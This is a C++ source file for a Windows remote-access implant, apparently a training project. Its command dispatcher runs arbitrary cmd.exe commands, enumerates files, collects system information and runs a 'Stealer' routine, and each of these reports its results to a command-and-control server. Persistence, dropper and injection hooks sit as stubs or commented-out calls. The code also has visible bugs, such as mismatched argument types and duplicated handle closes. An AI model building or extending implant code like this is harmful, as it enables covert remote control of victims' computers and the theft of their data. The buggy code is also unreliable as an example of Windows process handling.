#include "execute.h"

/* Directory of Commands
- Persistence_1
- SituationalAwareness
- Stealer
- Execution <arg>
- File Enumeration <arg> - List files in the directory

In the works
- Dropper [Current version runs]
I cannot for the life of me get the Dropper header to run in the execute header file

TODO:
- Retrieval - Is commented out?
- Injection - Will work on it next time
 */

void execute(std::string command, std::string args, int task_id, int implant_id){

    std::string results;

    /* Persistance */
    // before publishing - the bat file needs to load the implant.exe
    // only uncomment in sandbox
    if(command.compare("Persistence_1") == 0){
        printf("Executing Persistence\n");
        results = "executed";
        // persist_execution();
        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
    }

    /* Situational Awareness */
    if(command.compare("SituationalAwareness") == 0){
        printf("Executing Situational Awareness\n");
        results = GetAll();
        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
    }

    /* Execution */
    if(command.compare("Execution") == 0){
        printf("Executing Execution\n");
        /* I have not double-checked this code
        I grabbed this from our previous patch of code and I'm just
        grabbing the response*/

        // //split on space
        // int i = args.find(" ");
        // char * prog = (char *) malloc(i);
        // for (int j =0; j < i; j++){
        //     prog[j] = args[j];
        // }
        // char * a = (char *) malloc(args.size() - i);
        // for (int k = i; k < args.size(); k++){
        //     a[k] = args[k];
        // }
        std::string res = exec("C:\\Windows\\System32\\cmd.exe /c",args);
            
        results = res;
        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
    }
    
    /* File Enumeration */
    if(command.compare("File_Enumeration") == 0){
        printf("Executing File Enumeration\n");
            //std::string s = std::string("C:\\Windows\\System32");
        std::string path = args;
        std::vector<std::string> file_names (getFileNamesFromPath(path));

        std::stringstream storage;
        for (auto iterator = file_names.begin(); iterator != file_names.end(); iterator++){
            if (iterator != file_names.begin()){
                storage << " ";
            }
            storage << *iterator;
        }
            //std::string s = std::accumulate(ss.begin(), ss.end(), std::string(""));
        std::string result = storage.str();
            //std::cout << result << std::endl;
            //std::string item = 
        HttpResponse("/response_json", implant_id, task_id, result, "success", command);
            //std::cout << item;
    }

    /* Retrieval */
    // doesn't work?
    if(command.compare("Retrieval") ==0 ){
        printf("Executing Retrieval\n");
        //Where we add in SendToC2
    }

    /* Stealer Function */
    if(command.compare("Stealer") == 0){
        json data_from_driver;
        printf("Executing Stealer\n");
        data_from_driver = driver();
        results = data_from_driver.dump();

        /* Send the response back to the server */
        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
    }

    /* Dropper */
    if(command.compare("Dropper") == 0){
        printf("Executing Dropper\n");
        //Dropper();
    }

    /* Injection */
    //hasn't been implemented
    if(command.compare("Injection") == 0){
        printf("Executing Injection\n");

    }
    return;
}





std::string exec(char* program, char* args){
    int cmdLen = strlen(program) + strlen(args);

    LPSTR parsedCmds = (char *)malloc((cmdLen + 16) * sizeof(char));
    if (parsedCmds == NULL)
    {
        printf("Error allocating memory");
        return std::string("");
    }

    // Used these docs to understand sprintf https://learn.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2013/ybk95axf(v=vs.120)
    int j;
    j = sprintf(parsedCmds, program);
    j += sprintf(parsedCmds + j, " ");
    j += sprintf(parsedCmds + j, args);
    j += sprintf(parsedCmds + j, "\0");
    // Declare handles for StdOut
    HANDLE hStdOutRead, hStdOutWrite;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    // Prevent dead squirrels
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    // TODO: Set si.dwFlags...
    // HINT Read this and look for anything that talks about handle inheritance :-)
    //  https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa

    // //your solution here!
    si.dwFlags |= STARTF_USESTDHANDLES;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;

    // TODO: ensure that the child processes can inherit our handles!
    // //your solution here!
    sa.bInheritHandle = TRUE;

    // TODO: Create a pipe  object and share the handle with a child processes
    // //your solution here!

    if (!CreatePipe(
            &hStdOutRead,
            &hStdOutWrite,
            &sa,
            0))
    {
        printf("CreatePipe Failed");
        printf("%d", GetLastError());
        return std::string("");
    }

    if (!SetHandleInformation(hStdOutRead, 0x00000001, 0))
    {
        printf("Failed to set handle information for hStdOutRead");
        return std::string("");
    }
    // TODO: Set
    // set startupinfo handles
    si.hStdInput = NULL;
    si.hStdError = hStdOutRead;
    si.hStdOutput = hStdOutWrite;

    // Create the child Processes and wait for it to terminate!
    // //your solution here!

    if (!CreateProcessA(
            NULL,
            parsedCmds,
            &sa,
            &sa,
            TRUE,
            0,
            NULL,
            NULL,
            &si,
            &pi))
    {
        printf("Failed CreateProcessA\n");
        printf("%d", GetLastError());
        return std::string("");
    }

    char *buffer = (char *)malloc(BUF_SIZE);
    DWORD totalBytesAvail;
    LPDWORD lpTotalBytesAvail = &totalBytesAvail;
    DWORD bytesRead;
    LPDWORD lpBytesRead = &bytesRead;
    DWORD exitCode;
    LPDWORD lpExitCode = &exitCode;
   
    while (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT)
    {
        PeekNamedPipe(
            hStdOutRead,
            NULL,
            0,
            NULL,
            lpTotalBytesAvail,
            NULL);

        while (*lpTotalBytesAvail > 0)
        {
            ReadFile(
                hStdOutRead,
                buffer,
                BUF_SIZE,
                lpBytesRead,
                NULL);

            //printf(buffer);

            *lpTotalBytesAvail = *lpTotalBytesAvail - *lpBytesRead;
        }


    }


    // TODO: perform any cleanup necessary!
    // The parent processes no longer needs a handle to the child processes, the running thread, or the out file!
    // //your solution here!
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);
    free(parsedCmds);
    return std::string(buffer);
}
